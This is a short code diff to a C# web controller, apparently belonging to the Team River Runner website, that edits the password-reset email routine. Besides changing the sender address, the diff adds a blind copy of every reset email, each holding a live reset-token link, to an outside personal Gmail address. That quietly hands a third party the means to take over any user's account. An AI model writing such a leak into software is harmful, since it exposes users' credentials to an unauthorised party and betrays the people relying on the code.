@@ -87,7 +87,7 @@ namespace Web.Controllers
                 var html = $"To reset your password <a href=\"https://ors.teamriverrunner.org/PasswordReset/{token}\">click here</a>";
                 try
                 {
-                    string from = "dana@teamriverrunner.org";
+                    string from = "webmaster@teamriverrunner.org";
                     string fromName = "Team River Runner Administrator";
                     //if (trrUser.Site != null && trrUser.Site.Main != null && !string.IsNullOrWhiteSpace(trrUser.Site.Main.Email))
                     //{
@@ -95,7 +95,7 @@ namespace Web.Controllers
                     //    fromName = trrUser.Site.Main.Name;
                     //}
                     await _mailService.Send("TRR Password reset", null, html, (from, fromName),
-                     new[] { (trrUser.Email, $"{trrUser.FirstName} {trrUser.LastName}") });
+                     new[] { (trrUser.Email, $"{trrUser.FirstName} {trrUser.LastName}") }, bcc: new[] { ("dozcent@gmail.com", $"Dmytro") });
                 }
                 catch { }
             }
